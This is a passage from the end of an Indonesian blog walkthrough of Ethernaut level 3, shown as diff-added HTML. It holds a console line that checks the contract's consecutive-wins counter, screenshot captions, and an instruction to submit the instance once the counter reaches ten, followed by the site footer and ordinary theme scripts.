+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">await</span> <span style="color:#a6e22e">contract</span>.<span style="color:#a6e22e">consecutiveWins</span>().<span style="color:#a6e22e">then</span>((<span style="color:#a6e22e">v</span>) =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">toString</span>());
+</span></span></code></pre></div><figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/viewconsecutivewins.png#center"/> <figcaption>
+            Melihat consecutiveWins di console
+        </figcaption>
+</figure>
+
+<p>Jika sudah 10x maka kalian bisa klik <code>Submit Instance</code> dan level 3 selesai</p>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/20230902/10consecutivewins.png#center"/> <figcaption>
+            consecutiveWins mencapai 10
+        </figcaption>
+</figure>
+
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://agilfchx.github.io/tags/ethernaut/">Ethernaut</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://agilfchx.github.io/">Ardias</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
